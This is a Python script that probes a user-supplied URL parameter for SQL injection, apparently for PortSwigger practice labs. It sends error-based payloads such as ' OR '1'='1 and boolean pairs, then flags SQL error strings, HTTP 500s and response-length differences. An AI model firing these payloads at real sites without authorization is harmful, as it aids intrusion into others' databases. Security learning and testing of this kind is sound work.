import requests

# Payloads
ERROR_PAYLOADS = ["'", '"', "';--", "' OR '1'='1", "' OR '1'='1'--"]

# Strings that indicate SQLi vulnerability
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "syntax error",
    "mysql_fetch",
    "pg_query"
]

# PortSwigger labs require a session cookie — pass it at runtime when prompted
COOKIES = {}


def scan_sqli(url, param, method="GET", data=None, cookies=None):
    """
    url     : full URL e.g. https://target.com/page
    param   : the parameter to inject into e.g. 'id' or 'username'
    method  : "GET" or "POST"
    data    : dict of additional form fields/parameters to send
    cookies : optional dict of cookies to send with each request
    """
    if data is None:
        data = {}
    if cookies is None:
        cookies = {}

    print(f"\n[*] Starting SQLi scan on {url} | param: {param} | method: {method.upper()}")
    print(f"[*] Additional data: {data}")
    print(f"[*] Cookies: {cookies}")
    vulnerable = False

    def make_request(payload):
        req_data = data.copy()
        req_data[param] = payload
        if method.upper() == "POST":
            return requests.post(url, data=req_data, timeout=10, cookies=cookies)
        else:
            return requests.get(url, params=req_data, timeout=10, cookies=cookies)

    # --- Get a baseline response (normal value) ---
    try:
        baseline = make_request("1")
        baseline_len = len(baseline.text)
        print(f"[*] Baseline response | Status: {baseline.status_code} | Length: {baseline_len}")
    except requests.RequestException as e:
        print(f"[-] Baseline request failed: {e}")
        baseline_len = 0

    # --- METHOD 1: Error-based ---
    for payload in ERROR_PAYLOADS:
        try:
            response = make_request(payload)
            resp_len = len(response.text)
            print(f"[DEBUG] Payload: {payload!r} | Status: {response.status_code} | Length: {resp_len}")
            body = response.text.lower()

            # Check 1: HTTP 500 = server crash from bad SQL
            if response.status_code == 500:
                print(f"[!] ERROR-BASED SQLi DETECTED (HTTP 500)")
                print(f"    Payload  : {payload}")
                print(f"    Server returned Internal Server Error")
                vulnerable = True

            # Check 2: SQL error strings in response body
            for sig in ERROR_SIGNATURES:
                if sig in body:
                    print(f"[!] ERROR-BASED SQLi DETECTED (error string)")
                    print(f"    Payload  : {payload}")
                    print(f"    Signature: '{sig}' found in response")
                    vulnerable = True
                    break

            # Check 3: Response much larger than baseline = data exfiltration
            if baseline_len > 0 and resp_len > baseline_len * 1.5:
                print(f"[!] UNION/OR-BASED SQLi DETECTED (response size anomaly)")
                print(f"    Payload           : {payload}")
                print(f"    Baseline length   : {baseline_len}")
                print(f"    Injected length   : {resp_len}")
                print(f"    Extra data pulled : {resp_len - baseline_len} chars")
                vulnerable = True

        except requests.RequestException as e:
            print(f"[-] Request failed: {e}")

    # --- METHOD 2: Boolean-based ---
    try:
        true_payload  = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"

        true_response  = make_request(true_payload)
        false_response = make_request(false_payload)

        len_true  = len(true_response.text)
        len_false = len(false_response.text)

        print(f"[DEBUG] Boolean TRUE  | Status: {true_response.status_code} | Length: {len_true}")
        print(f"[DEBUG] Boolean FALSE | Status: {false_response.status_code} | Length: {len_false}")

        if abs(len_true - len_false) > 50:
            print(f"[!] BOOLEAN-BASED SQLi DETECTED")
            print(f"    True response length : {len_true}")
            print(f"    False response length: {len_false}")
            print(f"    Difference           : {abs(len_true - len_false)} chars")
            vulnerable = True

    except requests.RequestException as e:
        print(f"[-] Boolean check failed: {e}")

    # --- RESULT ---
    if not vulnerable:
        print("[+] No SQLi detected with current payloads")

    return vulnerable


# --- Run it ---
if __name__ == "__main__":
    target_url = input("Enter target URL: ").strip()
    target_param = input("Enter parameter to test: ").strip()
    req_method = input("Enter method (GET/POST) [GET]: ").strip().upper() or "GET"
    
    extra_data_str = input("Enter additional data as key=value,key2=value2 (press Enter to skip): ").strip()
    extra_data = {}
    if extra_data_str:
        for pair in extra_data_str.split(','):
            if '=' in pair:
                k, v = pair.split('=', 1)
                extra_data[k.strip()] = v.strip()
                
    session_cookie = input("Enter session cookie (press Enter to skip): ").strip()

    cookies = {"session": session_cookie} if session_cookie else {}

    scan_sqli(target_url, target_param, method=req_method, data=extra_data, cookies=cookies)
